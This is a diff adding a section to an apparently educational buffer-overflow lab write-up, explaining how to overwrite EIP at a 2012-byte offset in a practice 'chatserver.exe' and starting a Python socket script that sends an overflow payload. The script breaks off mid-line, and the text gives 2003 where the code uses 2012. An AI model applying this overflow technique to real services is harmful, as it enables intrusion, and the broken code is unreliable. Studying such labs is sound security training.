@@ -245,7 +245,70 @@ print "A" * 5000
         
             - **This information is critical, because this means that exactly at `2012 bytes`, we can control `EIP` overwriting it**
 
+---
 
+### Overwriting the EIP
+
+- We know that the offset for make the program crash and point exactly to the `EIP` is at `2012 bytes`.
+
+    - **That means, `2012 bytes` just before to get to the `EIP`**
+    
+    - **The `EIP` itself is `4 bytes` long** 
+    
+- So, we going to overwrite this specific `4 bytes`! ;)  
+
+- We know that EIP is 4 bytes because is the lenght of size we overwrite it:
+
+- ![image](https://user-images.githubusercontent.com/94720207/169572789-2bd05515-926e-4dfd-9f99-b08529fa412f.png)
+ 
+
+    - Again, We only need to copy that code and modify the `l.py` or `2.py` that we made on past tasks.
+    
+    - We can make another file called `3.py` with the modification.
+    
+        - **We delete de "offset" variable, we don't need it anymore.**
+        
+        - **And instead of "offset" we will place "shellcode" variable.**
+        
+            - **"shellcode" variable will be = "A" * 2003 + "B" * 4**
+
+```python
+    # We declare we are using python:
+    
+#!/usr/bin/python
+
+    # Import Socket is used to make the connection OUT (script[kali] >> target[windows chatserver.exe])
+    # Very similar to netcat
+    
+import socket
+
+    # Sys Module allows operating on the interpreter as it provides access to the variables and functions that interact strongly with the interpreter.
+    # For example: "print(sys.version)" will bring something like "id" linux bash command.
+    
+import sys
+
+    # 1 - The "chatserver.exe" prompt for a << name >> (no vulverable to buffer overflow)
+    #     variable ---> username
+    #     b        ---> "b" is used before the string to send the string as Bytes and no as String
+    
+username = b"fz3r0"
+
+    # 2 - The "chatserver.exe" prompt for a << message >> (vulverable to buffer overflow!!!)
+    #     variable ---> message
+    
+        # =-=-=-=-=-=-=-=-= The variable message contains the next trick! =-=-=-=-=-=-=-=-=-=-=
+    
+        # "A" * 2012    ---> I'll send 2012 bytes (A's) each time
+        #                    Remember, 2012 bytes is exactly the offset we use to make the system crash and point to the starting byte of EIP!!!
+        
+        # "B" * 4       ---> We are using "B" to identify the EIP, because "A" will reach to the "perfect world" buffer, then "B" will overwrite just the EIP spot! 
+
+        # "b"           ---> "b" is used before the string to send the string as Bytes and no as String
+        
+message = b"A" * 2012 + b"B" *
+
+
+```
 
 
 
